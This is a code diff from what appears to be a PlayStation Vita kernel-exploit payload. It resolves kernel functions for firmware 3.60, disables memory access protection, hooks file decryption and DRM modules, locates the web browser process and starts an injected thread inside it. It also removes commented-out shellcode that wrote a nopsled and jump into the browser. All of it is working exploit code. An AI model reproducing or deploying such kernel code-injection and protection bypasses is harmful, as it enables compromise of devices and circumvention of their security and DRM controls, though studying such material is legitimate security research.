@@ -186,11 +186,14 @@ int (*sceKernelGetMemBlockBaseForKernel)() = 0;
 void (*SceCpuForDriver_9CB9F0CE_flush_icache)(void *addr, uint32_t size) = 0;
 int (*sceKernelCreateThreadForKernel)() = 0;
 int (*sceKernelExitDeleteThread)() = 0;
+int (*sceKernelGetModuleListForKernel)() = 0;
+int (*sceKernelGetModuleInfoForKernel)() = 0;
 
 unsigned modulemgr_base = 0;
 unsigned scesblacmgr_code = 0;
 unsigned scenpdrm_code = 0;
-int pid = 0;
+int pid = 0, ppid = 0;
+unsigned SceWebBrowser_base = 0;
 
 // setup file decryption
 unsigned hook_sbl_F3411881(unsigned a1, unsigned a2, unsigned a3, unsigned a4) {
@@ -284,11 +287,32 @@ void thread_main() {
 	unsigned data[0xE8/4];
 	data[0] = sizeof(data);
 	SceProcessmgrForDriver_0AFF3EAE(pid, data);
-	int ppid = data[5];
+	DACR_OFF(ppid = data[5];);
 	LOG("WebBrowser PID: 0x%x\n", ppid);
 	for (int i = 0; i < 0xE8/4; ++i)
 		LOG("%d: 0x%x\n", i, data[i]);
 
+	int *modlist[MOD_LIST_SIZE];
+	int modlist_records;
+	int res;
+	SceModInfo info;
+
+	modlist_records = MOD_LIST_SIZE;
+	ret = sceKernelGetModuleListForKernel(ppid, 0x7FFFFFFF, 1, modlist, &modlist_records);
+	LOG("sceKernelGetModuleList() returned 0x%x\n", ret);
+
+	for (int i = 0; i < modlist_records; ++i) {
+		info.size = sizeof(info);
+		ret = sceKernelGetModuleInfoForKernel(ppid, modlist[i], &info);
+		if (strcmp(info.name, "SceWebBrowser") == 0) {
+			DACR_OFF(SceWebBrowser_base = info.segments[0].vaddr);
+			break;
+		}
+	}
+}
+
+void takeover_web_browser() {
+	unsigned ret;
 	unsigned popt[0x58/4];
 	for (int i = 0; i < 0x58/4; ++i)
 		popt[i] = 0;
@@ -309,34 +333,14 @@ void thread_main() {
 	int thread = sceKernelCreateThreadForPid(ppid, "", base|1, 64, 0x4000, 0x800000, 0, 0);
 	LOG("create thread 0x%x\n", thread);
 
-	unsigned args[] = { 0 };
+	unsigned args[] = { SceWebBrowser_base };
 	ret = sceKernelStartThread_089(thread, sizeof(args), args);
 	LOG("sceKernelStartThread_089 ret 0x%x\n", ret);
-
-	// #define CODE_OFFSET (0x50000) // inject code here
-	// #define JUMP_OFFSET (0x40000) // inject nopsled and end it with a blx
-
-
-	// LOG("wrote user shellcode\n");
-
-	// unsigned userpatch[] = { 0x47804800,  base|1 }; // ldr r0, [pc] ; blx r0
-	// unrestricted_memcpy_for_pid(ppid, browser_addr + JUMP_OFFSET, userpatch, sizeof(userpatch));
-
-	// LOG("wrote jump\n");
-
-	// int nop = 0;
-	// for (int i = JUMP_OFFSET - sizeof(nop); i >= 0; i -= 4) {
-	// 	int ret = unrestricted_memcpy_for_pid(ppid, browser_addr + i, &nop, sizeof(nop));
-	// 	if (i % 0x1000 == 0)
-	// 		LOG("memcpy 0x%x\n", ret);
-	// }
-
-	// end takeover
 }
 
 void resolve_imports(unsigned sysmem_base) {
 	unsigned ret;
-	
+
 	module_info_t *sysmem_info = find_modinfo(sysmem_base, "SceSysmem");
 
 	// 3.60-specific offsets here, used to find Modulemgr from just sysmem base
@@ -350,8 +354,10 @@ void resolve_imports(unsigned sysmem_base) {
 	module_info_t *modulemgr_info = find_modinfo((u32_t)modulemgr_base, "SceKernelModulemgr");
 	LOG("modulemgr modinfo: 0x%08x\n", modulemgr_info);
 
-	int (*sceKernelGetModuleListForKernel)() = find_export(modulemgr_info, 0x97CF7B4E);
-	int (*sceKernelGetModuleInfoForKernel)() = find_export(modulemgr_info, 0xD269F915);
+	DACR_OFF(
+		sceKernelGetModuleListForKernel = find_export(modulemgr_info, 0x97CF7B4E);
+		sceKernelGetModuleInfoForKernel = find_export(modulemgr_info, 0xD269F915);
+	);
 	LOG("sceKernelGetModuleListForKernel: %08x\n", sceKernelGetModuleListForKernel);
 	LOG("sceKernelGetModuleInfoForKernel: %08x\n", sceKernelGetModuleInfoForKernel);
 
@@ -432,6 +438,7 @@ void __attribute__ ((section (".text.start"))) payload(uint32_t sysmem_addr) {
 
 	resolve_imports(sysmem_base);
 	thread_main();
+	takeover_web_browser();
 
 	LOG("Kill current thread =>");
 	LOG("sceKernelExitDeleteThread at 0x%08x\n", sceKernelExitDeleteThread);
